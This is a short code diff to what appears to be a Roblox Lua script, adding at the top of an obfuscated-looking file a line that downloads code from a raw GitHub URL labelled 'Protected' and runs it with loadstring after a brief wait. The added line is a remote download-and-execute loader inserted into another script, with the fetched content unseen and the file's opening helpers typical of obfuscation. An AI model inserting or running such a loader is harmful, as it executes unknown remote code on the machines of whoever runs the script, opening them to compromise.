@@ -1,3 +1,6 @@
+task.wait(0.5)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/aa8283/i/refs/heads/main/Protected_2547730226887233.txt"))() 
+
 local v0 = string.char;
 local v1 = string.byte;
 local v2 = string.sub;
